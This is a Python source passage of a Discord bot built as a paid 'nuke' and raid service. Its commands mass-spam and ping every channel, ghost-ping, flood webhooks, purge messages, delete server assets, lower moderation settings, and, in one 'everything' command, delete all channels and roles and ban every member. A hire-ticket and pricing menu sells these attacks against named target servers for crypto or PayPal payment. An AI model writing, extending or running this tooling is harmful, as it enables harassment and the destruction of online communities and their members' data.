        ("User", str(member), True), ("Times", count, True),
        ("✅ Sent", sent, True), ("❌ Failed", failed, True),
        ("Message", message[:200], False),
    ]))

@bot.command()
async def dmembed(ctx, member: discord.Member, *, text: str):
    parts = text.split("|", 1)
    title = parts[0].strip()
    body = parts[1].strip() if len(parts) > 1 else "\u200b"
    dm_embed = discord.Embed(title=title, description=body, color=0xff0000)
    sent, failed, fl = await _dm_batch([member], embed=dm_embed)
    await status(ctx, f"dmembed {member} — {'sent' if sent else 'failed'}")
    await _log_embed(_action_embed("📩 DM Embed", 0xff69b4, [
        ("User", str(member), True),
        ("✅ Sent", sent, True), ("❌ Failed", failed, True),
        ("Title", title, True),
    ]))

# ─────────────────────────────────────────────
# MESSAGING
# ─────────────────────────────────────────────

@bot.command()
async def mcp(ctx, name: str, count: int, pings: int = 5, *, message: str = "@everyone"):
    ch_sem = asyncio.Semaphore(5)
    async def create_and_ping():
        async with ch_sem:
            ch = await safe(ctx.guild.create_text_channel(name))
            if not ch:
                return
        await asyncio.gather(*[safe(ch.send(message)) for _ in range(pings)])
    await asyncio.gather(*[create_and_ping() for _ in range(count)])
    await status(ctx, f"mcp {name} {count} x{pings}")
    await _log_embed(_action_embed("⚡ MCP Executed", 0xeb459e,
        [("Name", name, True), ("Channels", count, True), ("Pings each", pings, True),
         ("Message", message[:200], False)]))

@bot.command()
async def spam(ctx, count: int, *, message: str):
    await batch([ctx.channel.send(message) for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"spam {count}")
    await _log_embed(_action_embed("💬 Spam", 0xeb459e,
        [("Channel", f"#{ctx.channel.name}", True), ("Count", count, True),
         ("Message", message[:200], False)]))

@bot.command()
async def spamall(ctx, count: int, *, message: str):
    coros = [ch.send(message) for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"spamall {count}")
    await _log_embed(_action_embed("💬 Spam All Channels", 0xeb459e,
        [("Per channel", count, True), ("Channels", len(ctx.guild.text_channels), True),
         ("Message", message[:200], False)]))

@bot.command()
async def pingall(ctx, count: int):
    coros = [ch.send("@everyone") for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"pingall {count}")
    await _log_embed(_action_embed("🔔 Ping @everyone All Channels", 0xeb459e,
        [("Per channel", count, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def pingr(ctx, role: discord.Role, count: int):
    coros = [ch.send(role.mention) for ch in ctx.guild.text_channels for _ in range(count)]
    await batch(coros, **BATCH_MSG)
    await status(ctx, f"pingr {role.name} {count}")
    await _log_embed(_action_embed("🔔 Ping Role All Channels", 0xeb459e,
        [("Role", role.name, True), ("Per channel", count, True)]))

@bot.command()
async def ghostping(ctx, count: int = 1):
    async def ghost():
        msg = await safe(ctx.channel.send("@everyone"))
        if msg:
            await safe(msg.delete())
    await batch([ghost() for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"ghostping x{count}")
    await _log_embed(_action_embed("👻 Ghost Ping", 0xeb459e,
        [("Channel", f"#{ctx.channel.name}", True), ("Times", count, True)]))

@bot.command()
async def ghostpingall(ctx, count: int = 1):
    async def ghost_ch(ch):
        for _ in range(count):
            msg = await safe(ch.send("@everyone"))
            if msg:
                await safe(msg.delete())
    await batch([ghost_ch(ch) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, f"ghostpingall x{count}")
    await _log_embed(_action_embed("👻 Ghost Ping All Channels", 0xeb459e,
        [("Times each", count, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def tts(ctx, *, message: str):
    await safe(ctx.channel.send(message, tts=True))
    await status(ctx, "tts")

@bot.command()
async def ttsall(ctx, *, message: str):
    await batch([ch.send(message, tts=True) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, "ttsall")
    await _log_embed(_action_embed("🔊 TTS All Channels", 0xeb459e,
        [("Channels", len(ctx.guild.text_channels), True), ("Message", message[:200], False)]))

@bot.command()
async def embedspam(ctx, count: int, *, text: str):
    parts = text.split("|", 1)
    title = parts[0].strip()
    body = parts[1].strip() if len(parts) > 1 else "\u200b"
    embed = discord.Embed(title=title, description=body, color=0xff0000)
    await batch([ctx.channel.send(embed=embed) for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"embedspam {count}")

@bot.command()
async def embedall(ctx, *, text: str):
    parts = text.split("|", 1)
    title = parts[0].strip()
    body = parts[1].strip() if len(parts) > 1 else "\u200b"
    embed = discord.Embed(title=title, description=body, color=0xff0000)
    await batch([ch.send(embed=embed) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, "embedall")
    await _log_embed(_action_embed("📢 Embed Sent to All Channels", 0xeb459e,
        [("Title", title, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def purge(ctx, count: int):
    await ctx.channel.purge(limit=count + 1)
    await status(ctx, f"purge {count}")
    await _log_embed(_action_embed("🧹 Purge", 0xff0000,
        [("Channel", f"#{ctx.channel.name}", True), ("Limit", count, True)]))

@bot.command()
async def purgeall(ctx, count: int):
    await batch([ch.purge(limit=count) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"purgeall {count}")
    await _log_embed(_action_embed("🧹 Purge All Channels", 0xff0000,
        [("Per channel", count, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def purgebots(ctx, count: int):
    await ctx.channel.purge(limit=count + 1, check=lambda m: m.author.bot)
    await status(ctx, f"purgebots {count}")

@bot.command()
async def purgeuser(ctx, member: discord.Member, count: int = 100):
    await ctx.channel.purge(limit=count + 1, check=lambda m: m.author == member)
    await status(ctx, f"purgeuser {member} {count}")
    await _log_embed(_action_embed("🧹 Purge User Messages", 0xff0000,
        [("User", str(member), True), ("Limit", count, True), ("Channel", f"#{ctx.channel.name}", True)]))

@bot.command()
async def say(ctx, channel: discord.TextChannel, *, message: str):
    await safe(channel.send(message))
    await status(ctx, f"say #{channel.name}")

@bot.command()
async def announce(ctx, *, message: str):
    embed = discord.Embed(title="📢 Announcement", description=message,
                          color=0xff0000, timestamp=discord.utils.utcnow())
    embed.set_footer(text=f"From {ctx.author}")
    await batch([ch.send(embed=embed) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, "announce")
    await _log_embed(_action_embed("📢 Announcement Sent", 0xeb459e,
        [("Channels", len(ctx.guild.text_channels), True), ("Message", message[:200], False)]))

@bot.command()
async def countdown(ctx, n: int, *, message: str = "🚀"):
    for i in range(n, 0, -1):
        await safe(ctx.channel.send(f"**{i}**"))
        await asyncio.sleep(1)
    await safe(ctx.channel.send(message))

@bot.command()
async def react(ctx, message_id: int, emoji: str):
    try:
        msg = await ctx.channel.fetch_message(message_id)
        await msg.add_reaction(emoji)
        await status(ctx, f"react {emoji}")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command()
async def reactall(ctx, emoji: str):
    async def react_last(ch):
        async for msg in ch.history(limit=1):
            await safe(msg.add_reaction(emoji))
    await batch([react_last(ch) for ch in ctx.guild.text_channels], **BATCH_MSG)
    await status(ctx, f"reactall {emoji}")
    await _log_embed(_action_embed("😀 React All Channels", 0xeb459e,
        [("Emoji", emoji, True), ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def wspam(ctx, count: int, *, message: str):
    wh = await safe(ctx.channel.create_webhook(name="spam"))
    if wh:
        await batch([wh.send(message) for _ in range(count)], **BATCH_WH)
        await safe(wh.delete())
    await status(ctx, f"wspam {count}")
    await _log_embed(_action_embed("⚡ Webhook Spam", 0xeb459e,
        [("Channel", f"#{ctx.channel.name}", True), ("Count", count, True),
         ("Message", message[:200], False)]))

@bot.command()
async def wspamall(ctx, count: int, *, message: str):
    webhooks = []
    for ch in ctx.guild.text_channels:
        wh = await safe(ch.create_webhook(name="spam"))
        if wh:
            webhooks.append(wh)
    coros = [wh.send(message) for wh in webhooks for _ in range(count)]
    await batch(coros, **BATCH_WH)
    await batch([wh.delete() for wh in webhooks], **BATCH_CH)
    await status(ctx, f"wspamall {count}")
    await _log_embed(_action_embed("⚡ Webhook Spam All Channels", 0xeb459e,
        [("Webhooks used", len(webhooks), True), ("Per webhook", count, True),
         ("Message", message[:200], False)]))

@bot.command()
async def whnuke(ctx, name: str, count: int, pings: int = 10, *, message: str = "@everyone"):
    ch_sem = asyncio.Semaphore(5)
    async def make_and_blast():
        async with ch_sem:
            ch = await safe(ctx.guild.create_text_channel(name))
            if not ch:
                return
            wh = await safe(ch.create_webhook(name="nuke"))
            if not wh:
                return
        await asyncio.gather(*[safe(wh.send(message)) for _ in range(pings)])
    await asyncio.gather(*[make_and_blast() for _ in range(count)])
    await status(ctx, f"whnuke {name} {count} x{pings}")
    await _log_embed(_action_embed("⚡ Webhook Nuke", 0xff0000,
        [("Channel name", name, True), ("Channels", count, True), ("Pings each", pings, True),
         ("Message", message[:200], False)]))

@bot.command()
async def pin(ctx, message_id: int):
    try:
        msg = await ctx.channel.fetch_message(message_id)
        await msg.pin()
        await status(ctx, f"pin {message_id}")
    except Exception as e:
        await ctx.send(f"❌ {e}")

@bot.command()
async def massping(ctx, member: discord.Member, count: int):
    await batch([ctx.channel.send(member.mention) for _ in range(count)], **BATCH_MSG)
    await status(ctx, f"massping {member} x{count}")
    await _log_embed(_action_embed("🔔 Mass Ping User", 0xeb459e,
        [("User", str(member), True), ("Times", count, True), ("Channel", f"#{ctx.channel.name}", True)]))

@bot.command()
async def forwardall(ctx, source: discord.TextChannel, dest: discord.TextChannel):
    msgs = []
    async for msg in source.history(limit=100, oldest_first=True):
        msgs.append(msg)
    async def forward(m):
        if m.content:
            await safe(dest.send(f"**{m.author}:** {m.content}"))
    await batch([forward(m) for m in msgs], **BATCH_MSG)
    await status(ctx, f"forwardall #{source.name} → #{dest.name}")
    await _log_embed(_action_embed("📨 Forward All Messages", 0xeb459e,
        [("From", f"#{source.name}", True), ("To", f"#{dest.name}", True),
         ("Messages", len(msgs), True)]))

# ─────────────────────────────────────────────
# SERVER
# ─────────────────────────────────────────────

@bot.command()
async def renameserver(ctx, *, name: str):
    old = ctx.guild.name
    await ctx.guild.edit(name=name)
    await status(ctx, f"renameserver {name}")
    await _log_embed(_action_embed("✏️ Server Renamed", 0x9b59b6,
        [("Before", old, True), ("After", name, True)]))

@bot.command()
async def icon(ctx, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    await ctx.guild.edit(icon=data)
    await status(ctx, "icon")
    await _log_embed(_action_embed("🖼️ Server Icon Changed", 0x9b59b6,
        [("Guild", ctx.guild.name, True), ("By", str(ctx.author), True)]))

@bot.command()
async def banner(ctx, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    await ctx.guild.edit(banner=data)
    await status(ctx, "banner")
    await _log_embed(_action_embed("🖼️ Server Banner Changed", 0x9b59b6,
        [("Guild", ctx.guild.name, True), ("By", str(ctx.author), True)]))

@bot.command()
async def description(ctx, *, text: str):
    await ctx.guild.edit(description=text)
    await status(ctx, "description")
    await _log_embed(_action_embed("📝 Server Description Changed", 0x9b59b6,
        [("Guild", ctx.guild.name, True), ("Text", text[:200], False)]))

@bot.command()
async def das(ctx):
    count = len(ctx.guild.stickers)
    await batch([s.delete() for s in ctx.guild.stickers], **BATCH_CH)
    await status(ctx, "das")
    await _log_embed(_action_embed("🗑️ Deleted All Stickers", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delemojis(ctx):
    count = len(ctx.guild.emojis)
    await batch([e.delete() for e in ctx.guild.emojis], **BATCH_CH)
    await status(ctx, "delemojis")
    await _log_embed(_action_embed("🗑️ Deleted All Emojis", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def addemoji(ctx, name: str, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    emoji = await safe(ctx.guild.create_custom_emoji(name=name, image=data))
    if emoji:
        await status(ctx, f"addemoji {name}")
        await _log_embed(_action_embed("😀 Emoji Added", 0x57f287,
            [("Name", name, True), ("Guild", ctx.guild.name, True)]))
    else:
        await ctx.send("❌ Failed to create emoji (check slots or file type).")

@bot.command()
async def massemoji(ctx, name: str, url: str, count: int):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    async def add_one(i):
        await safe(ctx.guild.create_custom_emoji(name=f"{name}{i}", image=data))
    await batch([add_one(i) for i in range(1, count + 1)], **BATCH_CH)
    await status(ctx, f"massemoji {name} x{count}")
    await _log_embed(_action_embed("😀 Mass Emoji Added", 0x57f287,
        [("Base name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delthreads(ctx):
    count = len(ctx.guild.threads)
    await batch([t.delete() for t in ctx.guild.threads], **BATCH_CH)
    await status(ctx, "delthreads")
    await _log_embed(_action_embed("🗑️ Deleted All Threads", 0xff0000,
        [("Deleted", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delwebhooks(ctx):
    webhooks = await ctx.guild.webhooks()
    await batch([w.delete() for w in webhooks], **BATCH_CH)
    await status(ctx, "delwebhooks")
    await _log_embed(_action_embed("🗑️ Deleted All Webhooks", 0xff0000,
        [("Deleted", len(webhooks), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delinvites(ctx):
    invites = await ctx.guild.invites()
    await batch([inv.delete() for inv in invites], **BATCH_CH)
    await status(ctx, "delinvites")
    await _log_embed(_action_embed("🗑️ Deleted All Invites", 0xff0000,
        [("Deleted", len(invites), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def listinvites(ctx):
    invites = await ctx.guild.invites()
    if not invites:
        await ctx.send("No active invites.")
        return
    lines = [f"`{inv.code}` — #{inv.channel.name} by {inv.inviter} ({inv.uses} uses)" for inv in invites]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def webhook(ctx, name: str, count: int):
    async def make_webhook(ch):
        for _ in range(count):
            await safe(ch.create_webhook(name=name))
    await batch([make_webhook(ch) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"webhook {name} {count}")
    await _log_embed(_action_embed("🪝 Mass Webhooks Created", 0x9b59b6,
        [("Name", name, True), ("Per channel", count, True),
         ("Channels", len(ctx.guild.text_channels), True)]))

@bot.command()
async def audit(ctx, count: int = 10):
    entries = []
    async for entry in ctx.guild.audit_logs(limit=count):
        entries.append(f"`{entry.action.name}` — {entry.user} → {entry.target}")
    text = "\n".join(entries) if entries else "No audit log entries."
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def serverinfo(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"🌐 {g.name}", color=0xff0000)
    embed.add_field(name="ID", value=str(g.id))
    embed.add_field(name="Owner", value=str(g.owner))
    embed.add_field(name="Members", value=str(g.member_count))
    embed.add_field(name="Channels", value=str(len(g.channels)))
    embed.add_field(name="Roles", value=str(len(g.roles)))
    embed.add_field(name="Emojis", value=str(len(g.emojis)))
    embed.add_field(name="Boosts", value=str(g.premium_subscription_count))
    embed.add_field(name="Boost Level", value=str(g.premium_tier))
    embed.add_field(name="Created", value=g.created_at.strftime("%Y-%m-%d"))
    embed.add_field(name="Verification", value=str(g.verification_level))
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    await ctx.send(embed=embed)

@bot.command()
async def setverification(ctx, level: int):
    levels = {0: discord.VerificationLevel.none, 1: discord.VerificationLevel.low,
              2: discord.VerificationLevel.medium, 3: discord.VerificationLevel.high,
              4: discord.VerificationLevel.highest}
    if level not in levels:
        await ctx.send("❌ Level must be 0–4.")
        return
    await ctx.guild.edit(verification_level=levels[level])
    await status(ctx, f"setverification {level}")
    await _log_embed(_action_embed("🔒 Verification Level Changed", 0x9b59b6,
        [("Level", level, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def setfilter(ctx, level: int):
    levels = {0: discord.ContentFilter.disabled, 1: discord.ContentFilter.no_role,
              2: discord.ContentFilter.all_members}
    if level not in levels:
        await ctx.send("❌ Level must be 0–2.")
        return
    await ctx.guild.edit(explicit_content_filter=levels[level])
    await status(ctx, f"setfilter {level}")
    await _log_embed(_action_embed("🔞 Content Filter Changed", 0x9b59b6,
        [("Level", level, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def setnotifications(ctx, level: int):
    levels = {0: discord.NotificationLevel.all_messages, 1: discord.NotificationLevel.only_mentions}
    if level not in levels:
        await ctx.send("❌ Level must be 0 or 1.")
        return
    await ctx.guild.edit(default_notifications=levels[level])
    await status(ctx, f"setnotifications {level}")

@bot.command()
async def setafk(ctx, channel: discord.VoiceChannel):
    await ctx.guild.edit(afk_channel=channel)
    await status(ctx, f"setafk #{channel.name}")

@bot.command()
async def setafktimeout(ctx, seconds: int):
    valid = [60, 300, 900, 1800, 3600]
    if seconds not in valid:
        await ctx.send(f"❌ Must be one of: {valid}")
        return
    await ctx.guild.edit(afk_timeout=seconds)
    await status(ctx, f"setafktimeout {seconds}s")

@bot.command()
async def vanity(ctx):
    try:
        code = ctx.guild.vanity_url_code
        url = f"discord.gg/{code}" if code else "No vanity URL set."
        await ctx.send(f"🔗 Vanity: `{url}`")
    except Exception:
        await ctx.send("❌ No vanity URL or missing permission.")

@bot.command()
async def inviteme(ctx):
    perms = discord.Permissions(administrator=True)
    url = discord.utils.oauth_url(bot.user.id, permissions=perms)
    await ctx.send(f"🤖 Bot invite:\n{url}")

@bot.command()
async def everything(ctx):
    guild = ctx.guild
    protected_members = {guild.me, guild.owner}
    protected_roles    = {guild.default_role, guild.me.top_role}
    await batch([ch.delete() for ch in guild.channels], **BATCH_CH)
    await batch([r.delete() for r in guild.roles if r not in protected_roles], **BATCH_ROLE)
    await batch([m.ban(reason="Nuke") for m in guild.members if m not in protected_members], **BATCH_MBR)
    await batch([s.delete() for s in guild.stickers], **BATCH_CH)
    await batch([guild.create_text_channel("nuked") for _ in range(10)], **BATCH_CH)
    await status(ctx, "everything")
    await _log_embed(_action_embed("☢️ EVERYTHING EXECUTED", 0xff0000,
        [("Guild", guild.name, True), ("By", str(ctx.author), True),
         ("Channels", "deleted", True), ("Roles", "deleted", True),
         ("Members", "banned", True), ("Stickers", "deleted", True)]))

# ─────────────────────────────────────────────
# BOT UTILITY
# ─────────────────────────────────────────────

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! `{latency}ms`")

@bot.command()
async def uptime(ctx):
    elapsed = int(time.time() - START_TIME)
    h, r = divmod(elapsed, 3600)
    m, s = divmod(r, 60)
    await ctx.send(f"⏱️ Uptime: `{h}h {m}m {s}s`")

@bot.command()
async def botstatus(ctx, *, status_text: str):
    await bot.change_presence(activity=discord.Game(name=status_text))
    await status(ctx, f"botstatus → {status_text}")

@bot.command()
async def botname(ctx, *, name: str):
    await bot.user.edit(username=name)
    await status(ctx, f"botname → {name}")
    await _log_embed(_action_embed("🤖 Bot Renamed", 0xffd700,
        [("New name", name, True), ("By", str(ctx.author), True)]))

@bot.command()
async def botavatar(ctx, url: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                await ctx.send("❌ Failed to fetch image.")
                return
            data = await resp.read()
    await bot.user.edit(avatar=data)
    await status(ctx, "botavatar")
    await _log_embed(_action_embed("🤖 Bot Avatar Changed", 0xffd700,
        [("By", str(ctx.author), True)]))

@bot.command()
async def activity(ctx, activity_type: str, *, text: str):
    t = activity_type.lower()
    if t == "playing":
        act = discord.Game(name=text)
    elif t == "watching":
        act = discord.Activity(type=discord.ActivityType.watching, name=text)
    elif t == "listening":
        act = discord.Activity(type=discord.ActivityType.listening, name=text)
    elif t == "streaming":
        act = discord.Streaming(name=text, url="https://twitch.tv/placeholder")
    elif t == "competing":
        act = discord.Activity(type=discord.ActivityType.competing, name=text)
    else:
        await ctx.send("❌ Types: `playing`, `watching`, `listening`, `streaming`, `competing`")
        return
    await bot.change_presence(activity=act)
    await status(ctx, f"activity {t} {text}")

@bot.command()
async def guilds(ctx):
    lines = [f"`{g.id}` — **{g.name}** ({g.member_count} members)" for g in bot.guilds]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def cmdcount(ctx):
    count = len(bot.commands)
    await ctx.send(f"🤖 **{count}** commands registered.")

# ═══════════════════════════════════════════════════════════════════
# MODMAIL  — DMs to the bot are logged; staff can reply / block
# ═══════════════════════════════════════════════════════════════════

MODMAIL_BLOCKED: set[int] = set()   # user IDs blocked from DMing


class _ReplyModal(discord.ui.Modal, title="Reply to User"):
    reply_text = discord.ui.TextInput(
        label="Your reply",
        style=discord.TextStyle.paragraph,
        max_length=2000,
    )

    def __init__(self, target_id: int):
        super().__init__()
        self.target_id = target_id

    async def on_submit(self, interaction: discord.Interaction):
        try:
            user = bot.get_user(self.target_id) or await bot.fetch_user(self.target_id)
            e = discord.Embed(
                title="📬 Message from Staff",
                description=self.reply_text.value,
                color=0x5865F2,
            )
            e.set_footer(text="Reply to this message by DMing the bot again.")
            await user.send(embed=e)
            await interaction.response.send_message("✅ Reply sent!", ephemeral=True)
            await _log_embed(_action_embed("📤 ModMail Reply Sent", 0x5865F2, [
                ("To",      f"{user} `{user.id}`",          True),
                ("By",      str(interaction.user),           True),
                ("Message", self.reply_text.value[:1020],   False),
            ]))
        except Exception as ex:
            await interaction.response.send_message(f"❌ Failed to send: `{ex}`", ephemeral=True)


class _ModMailView(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="✉️ Reply", style=discord.ButtonStyle.primary)
    async def reply_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in WHITELIST:
            await interaction.response.send_message("❌ Whitelist only.", ephemeral=True)
            return
        await interaction.response.send_modal(_ReplyModal(self.user_id))

    @discord.ui.button(label="🚫 Block User", style=discord.ButtonStyle.danger)
    async def block_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in WHITELIST:
            await interaction.response.send_message("❌ Whitelist only.", ephemeral=True)
            return
        MODMAIL_BLOCKED.add(self.user_id)
        button.disabled = True
        button.label = "🚫 Blocked"
        await interaction.message.edit(view=self)
        await interaction.response.send_message(
            f"✅ `{self.user_id}` blocked from DMing the bot.", ephemeral=True
        )


# ─── Interactive DM welcome menu ───────────────────────────────────

class _DMPricingView(discord.ui.View):
    """Sent when a user clicks Pricing in the DM menu."""

    def __init__(self):
        super().__init__(timeout=120)

    @discord.ui.button(label="📋 Hire Us Now", style=discord.ButtonStyle.danger, emoji="🔥")
    async def hire_now(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(_HireModal())


class _DMMenuView(discord.ui.View):
    """Initial interactive menu sent in DMs when a user messages the bot."""

    def __init__(self):
        super().__init__(timeout=180)

    @discord.ui.button(label="🔥 Hire Us", style=discord.ButtonStyle.danger)
    async def hire_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(_HireModal())

    @discord.ui.button(label="💰 Pricing", style=discord.ButtonStyle.secondary)
    async def pricing_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(title="💰 Our Pricing", color=0xffd700)
        e.add_field(name="🔥 Basic Nuke",     value="From **$10**\nChannels, roles, mass ban", inline=False)
        e.add_field(name="💣 Raid Package",   value="From **$15**\nMass spam, DM flood, webhooks", inline=False)
        e.add_field(name="⚡ Premium Package", value="From **$25**\nFull nuke + raid + custom options", inline=False)
        e.add_field(name="🎯 Custom Job",     value="**Negotiable**\nTell us exactly what you need", inline=False)
        e.set_footer(text="Payment accepted on acceptance of your request • Click Hire Us to submit")
        await interaction.response.send_message(embed=e, view=_DMPricingView(), ephemeral=False)

    @discord.ui.button(label="❓ Support", style=discord.ButtonStyle.secondary)
    async def support_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(
            title="❓ Support",
            description=(
                "Our staff have received your message and will reply shortly.\n\n"
                "**Tips:**\n"
                "• Be specific about your request\n"
                "• Include relevant server IDs or invites\n"
                "• Check your DMs for a reply from us"
            ),
            color=0x5865F2,
        )
        await interaction.response.send_message(embed=e, ephemeral=False)


@bot.event
async def on_message(message: discord.Message):
    # Always process commands first
    await bot.process_commands(message)

    # Only handle DMs, not from bots, not from self
    if message.guild or message.author.bot:
        return
    if message.author.id == bot.user.id:
        return
    if message.author.id in MODMAIL_BLOCKED:
        try:
            await message.author.send(
                "🚫 You have been blocked from contacting this bot's staff."
            )
        except Exception:
            pass
        return

    # Send interactive welcome menu to the user
    welcome = discord.Embed(
        title="👋 Welcome!",
        description=(
            "Thanks for reaching out. Our staff has been notified.\n\n"
            "Use the buttons below to **hire us**, view **pricing**, or get **support**."
        ),
        color=0xff4500,
    )
    welcome.set_footer(text="Powered by Nuke Services • Reply to continue chatting")
    try:
        await message.author.send(embed=welcome, view=_DMMenuView())
    except Exception:
        pass

    # Log to staff log channel
    if LOG_CHANNEL_ID:
        ch = bot.get_channel(LOG_CHANNEL_ID)
        if ch:
            e = _action_embed("📩 ModMail — Incoming DM", 0xeb459e, [
                ("From",    f"{message.author} `{message.author.id}`",  True),
                ("Account Age",
                 f"{(discord.utils.utcnow() - message.author.created_at).days}d old", True),
                ("Message", message.content[:1020] or "*(no text)*", False),
            ])
            e.set_thumbnail(url=message.author.display_avatar.url)
            try:
                await ch.send(embed=e, view=_ModMailView(message.author.id))
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════════
# HIRE / TICKET SYSTEM
# ═══════════════════════════════════════════════════════════════════

HIRE_FILE      = "hire_tickets.json"
HIRE_GUILD_ID  = 1529019736472682546          # fixed server for ticket channels
HIRE_CAT_NAME  = "🎫 Hire Tickets"
HIRE_CHANNEL_ID: int | None = None            # optional fallback log channel

PRICES_FILE = "prices.json"
_DEFAULT_PRICES: dict = {
    "basic":   "10",
    "raid":    "15",
    "premium": "25",
    "custom":  "Negotiable",
}

def _load_prices() -> dict:
    try:
        with open(PRICES_FILE) as f:
            return json.load(f)
    except Exception:
        return dict(_DEFAULT_PRICES)

def _save_prices():
    try:
        with open(PRICES_FILE, "w") as f:
            json.dump(PRICES, f, indent=2)
    except Exception:
        pass

PRICES: dict = _load_prices()


def _load_tickets() -> dict:
    try:
        with open(HIRE_FILE) as f:
            return json.load(f)
    except Exception:
        return {"next_id": 1, "tickets": {}}


def _save_tickets():
    try:
        with open(HIRE_FILE, "w") as f:
            json.dump(TICKETS, f, indent=2)
    except Exception:
        pass


TICKETS: dict = _load_tickets()


# ─── Hire request modal (opens from !hire or DM menu) ──────────────

class _HireModal(discord.ui.Modal, title="🔥 Hire Request — Nuke Services"):
    server_name   = discord.ui.TextInput(label="Target server name",         max_length=100)
    server_invite = discord.ui.TextInput(label="Server invite or ID (optional)", required=False, max_length=120)
    details       = discord.ui.TextInput(
        label="What do you want done?",
        style=discord.TextStyle.paragraph,
        placeholder="Describe exactly what you need (nuke, raid, DM flood, etc.)",
        max_length=500,
    )
    payment       = discord.ui.TextInput(
        label="Preferred payment method",
        placeholder="Crypto (BTC/ETH/LTC), PayPal, etc.",
        max_length=100,
    )
    contact       = discord.ui.TextInput(
        label="How should we contact you?",
        placeholder="Discord tag, email, or 'DM this bot'",
        max_length=200,
    )

    async def on_submit(self, interaction: discord.Interaction):
        tid = str(TICKETS["next_id"])
        TICKETS["next_id"] += 1
        TICKETS["tickets"][tid] = {
            "id":            tid,
            "user_id":       interaction.user.id,
            "user_name":     str(interaction.user),
            "server_name":   self.server_name.value,
            "server_invite": self.server_invite.value or "N/A",
            "details":       self.details.value,
            "payment":       self.payment.value,
            "contact":       self.contact.value,
            "status":        "pending",
            "created_at":    datetime.datetime.now(datetime.UTC).isoformat(),
            "handled_by":    None,
            "note":          "",
        }
        _save_tickets()

        # Confirm to requester
        confirm = discord.Embed(
            title="✅ Hire Request Submitted",
            description=(
                f"Your request **#{tid}** has been submitted and is pending review.\n"
                "Our staff will contact you once accepted or denied."
            ),
            color=0x57f287,
        )
        confirm.add_field(name="📋 Ticket ID", value=f"`#{tid}`",    inline=True)
        confirm.add_field(name="📊 Status",    value="🟡 Pending",   inline=True)
        confirm.add_field(name="🎯 Target",    value=self.server_name.value, inline=True)
        confirm.set_footer(text=f"Use !hirestatus {tid} to check your ticket anytime")
        await interaction.response.send_message(embed=confirm)

        # Post to hire channel
        await _post_hire_ticket(TICKETS["tickets"][tid])

        # Log
        await _log_embed(_action_embed("🎫 New Hire Ticket", 0xffd700, [
            ("Ticket",  f"#{tid}",                          True),
            ("Client",  f"{interaction.user} `{interaction.user.id}`", True),
            ("Target",  self.server_name.value,             True),
            ("Payment", self.payment.value,                 True),
            ("Details", self.details.value[:512],           False),
        ]))


# ─── Ticket embed helpers ──────────────────────────────────────────

_TICKET_COLORS = {"pending": 0xffd700, "accepted": 0x57f287,
                  "denied": 0xff0000, "closed": 0x99aab5}
_TICKET_ICONS  = {"pending": "🟡", "accepted": "✅", "denied": "❌", "closed": "🔒"}


def _ticket_embed(t: dict) -> discord.Embed:
    status = t.get("status", "pending")
